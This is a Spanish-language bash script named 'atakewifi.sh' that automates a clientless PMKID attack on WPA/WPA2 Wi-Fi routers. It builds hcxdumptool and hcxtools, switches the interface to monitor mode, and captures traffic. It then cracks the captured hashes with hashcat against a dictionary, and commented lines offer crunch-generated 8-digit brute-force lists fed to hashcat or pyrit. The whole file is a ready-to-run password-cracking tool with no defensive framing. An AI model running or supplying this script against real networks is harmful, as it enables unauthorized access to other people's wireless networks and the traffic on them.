##captura de trafico wifi para routers sin cliente
##buscamos pmks de routers que soporten roaming de ssid
echo Uso:
echo atakewifi.sh interfaz diccionario
echo ejemplo
echo "$atakewifi.sh wlan0 palabras.txt
IFACE=$1
DICCIONARIO=$2

##instalación

##dependencias
#sudo apt install -y aircrack-ng git hashcat 
##sudo apt install -y crunch pyrit
#sudo apt install -y pkg-config libcurl4-openssl-dev libssl-dev zlib1g-dev
##creamos carpeta de trabajo en home
mkdir ~/atakewifi
cd ~/atakewifi

##Hcxdumptool
git clone https://github.com/ZerBea/hcxdumptool
cd  hcxdumptool
sudo make clean
make
sudo make install
cd ..

##Hcxtools
git clone https://github.com/ZerBea/hcxtools
cd hcxtools
sudo make clean
make
sudo make install
cd ..

##al ataque
##activar modo monitor en interface wireless $IFACE

sudo ifconfig $IFACE down
sudo iwconfig $IFACE mode monitor|
sudo ifconfig $IFACE up

##desboquear interface wireless (rfkill)
sudo airmon-ng check kill
sudo airmon-ng start $IFACE >./monitornic.temp && IFACEMON=$(cat monitornic.temp |grep monitor -i )
##obener IFACEMON de la salida deiwconfig cat monitornic.temp 
IFACEMON=wlan0mon

##hcxdumptool para capturar el tráfico
cd ~/atakewifi/
mkdir capturas
sudo hcxdumptool/hcxdumptool -o capturas/attack.pcap -i $IFACEMON --enable_status=1

##convertimos la captura con hcxpcaptool para poder usarla con hashcat
hcxpcapngtool -z capturas/myhash.txt capturas/attack.pcap

##pasamos hashcat con el diccionario $DICCIONARIO 
hashcat -m 16800 --force capturas/myhash.txt "$DICCIONARIO"
##generamos diccionario de 8 dígitos con crunch y se lo pasamos al hashcat como diccionario ( -)
##crunch 8 8 0123456789 | hashcat -m 16800 --force myhash.txt -
##pyrit -i myhash.txt -a "$DICCIONARIO" attack_passthrough
##generamos diccionario de 8 dígitos con crunch y se lo pasamos al pyrit como diccionario (-a -)
##crunch 8 8 0123456789 | pyrit -i myhash.txt -a - attack_passthrough
